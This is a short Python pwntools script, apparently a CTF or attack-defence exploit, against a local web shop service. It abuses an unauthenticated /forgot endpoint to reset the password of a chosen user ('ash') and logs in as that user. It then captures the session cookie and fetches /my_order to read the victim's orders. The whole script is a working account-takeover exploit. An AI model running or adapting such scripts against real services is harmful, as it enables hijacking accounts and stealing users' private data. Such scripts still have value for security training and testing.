from pwn import *
import random
import string
import urllib.parse
import re

HOST = "127.0.0.1"
PORT = 8080

def generate_name(length=5):
    chars = string.ascii_lowercase
    return ''.join(random.choices(chars, k=length))

def forgot_password(username, new_password):
    username_encoded = urllib.parse.quote(username)
    new_password_encoded = urllib.parse.quote(new_password)

    body = f"username={username_encoded}&password={new_password_encoded}"

    forgot_request = (
        f"POST /forgot HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
        f"{body}"
    )

    with remote(HOST, PORT) as conn:
        conn.send(forgot_request.encode())
        response = conn.recv(4096).decode(errors='ignore')
        print(f"Forgot Password Response: {response}")

    # Запрос на регистрацию
    post_request = (
        f"POST /login HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
        f"{body}"
    )

    with remote(HOST, PORT) as conn:
        conn.send(post_request.encode())
        response = conn.recv(4096).decode(errors='ignore')
        print(f"Register Response: {response}")

    session_cookie = None
    match = re.search(r"Set-Cookie: (session=[^;]+)", response)
    if match:
        session_cookie = match.group(1)
        print("Session Cookie:", session_cookie)


    if session_cookie:
        my_orders_request = (
            f"GET /my_order HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Cookie: {session_cookie}\r\n"
            f"\r\n"
        )
        with remote(HOST, PORT) as conn:
            conn.send(my_orders_request.encode())
            orders_response = conn.recv(8192).decode(errors='ignore')
            print(f"My Orders Response: {orders_response}")



username = "ash"
new_password = "bugaga"

forgot_password(username, new_password)